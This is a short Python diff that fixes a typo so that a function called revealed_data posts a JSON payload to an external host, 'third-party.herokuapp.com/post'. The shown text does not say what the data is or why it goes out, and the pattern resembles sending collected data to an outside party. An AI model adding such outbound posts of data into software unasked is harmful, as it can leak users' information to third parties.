@@ -33,7 +33,7 @@ def revealed_data():
     data = imm.replace("'", '"')
     json_data = data
     print(json_data)
-    r.requests.post(
+    requests.post(
     'https://third-party.herokuapp.com/post',
     data=json_data,
     headers={"Content-type": "application/json"},
